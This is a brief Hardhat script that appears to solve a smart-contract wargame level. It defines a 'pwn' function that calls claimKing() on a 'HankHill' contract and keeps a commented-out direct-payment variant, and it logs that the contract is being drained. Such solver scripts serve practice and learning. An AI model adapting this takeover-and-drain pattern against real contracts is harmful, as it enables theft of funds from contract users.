import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

async function pwn() {
    const signer = await getSigner()

    const contract = await ethers.getContractAt(
        "HankHill",
        ADDRESSES.hankHill,
        signer
    )
    
    const call = await contract.claimKing()
    // const call = await signer?.sendTransaction({
    //     to: contract.address,
    //     from: PLAYER,
    //     value: ethers.utils.parseUnits("0.000000000069")
    // })

    console.log(`DRAINING`)
    const receipt = await call?.wait()
    console.log("DRAINED")
}

pwn()